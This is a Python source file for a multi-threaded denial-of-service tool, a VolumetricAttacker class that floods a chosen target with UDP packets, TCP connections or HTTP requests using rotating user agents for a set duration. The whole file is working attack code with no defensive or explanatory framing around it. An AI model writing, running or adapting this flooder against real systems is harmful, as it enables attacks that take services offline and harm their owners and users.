import socket
import threading
import time
import random
import urllib.request
from utils.network import parse_target, random_user_agent

class VolumetricAttacker:
    def __init__(self, target, vector_type="http", intensity=10):
        self.host, self.port = parse_target(target)
        self.vector = vector_type
        self.intensity = intensity
        self.active = True
        self.url = f"http://{self.host}:{self.port}/"

    def run(self, duration=60):
        threads = []
        num_threads = 5 * self.intensity
        for _ in range(num_threads):
            t = threading.Thread(target=self.worker, daemon=True)
            t.start()
            threads.append(t)
            time.sleep(0.005)
        time.sleep(duration)
        self.stop()

    def stop(self):
        self.active = False

    def worker(self):
        while self.active:
            try:
                if self.vector == "udp":
                    self._udp_flood()
                elif self.vector == "tcp":
                    self._tcp_flood()
                elif self.vector == "http":
                    self._http_flood()
                time.sleep(random.uniform(0.001, 0.01))
            except Exception:
                pass

    def _udp_flood(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.settimeout(1)
        payload = b"\x41" * 100
        sock.sendto(payload, (self.host, self.port))
        sock.close()

    def _tcp_flood(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1)
        try:
            sock.connect((self.host, self.port))
            sock.send(b"GET / HTTP/1.1\r\nHost: " + self.host.encode() + b"\r\n\r\n")
            time.sleep(0.5)
            sock.close()
        except:
            pass

    def _http_flood(self):
        req = urllib.request.Request(self.url, headers={
            'User-Agent': random_user_agent(),
            'Accept': 'text/html',
            'Connection': 'keep-alive'
        })
        try:
            urllib.request.urlopen(req, timeout=2)
        except:
            pass